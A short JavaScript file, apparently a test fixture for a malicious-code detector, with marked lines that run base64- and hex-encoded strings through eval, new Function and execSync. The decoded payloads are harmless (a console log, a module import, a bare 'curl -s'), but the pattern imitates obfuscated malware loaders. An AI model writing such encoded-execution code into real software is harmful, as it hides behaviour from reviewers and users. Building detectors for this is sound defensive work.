'use strict';
const os = require('os');
const { execSync } = require('child_process');

const stage = 'Y29uc29sZS5sb2coImhpIik=';
const data = { p: 'cmVxdWlyZSgiaHR0cHMiKQ==' };

if (os.platform() !== 'win32') {
~>  eval(atob(stage));
}
~>new Function(Buffer.from(data.p, 'base64').toString('utf8'))();

const cmd = Buffer.from('6375726c202d73', 'hex').toString();
~>execSync(cmd, { stdio: 'ignore' });
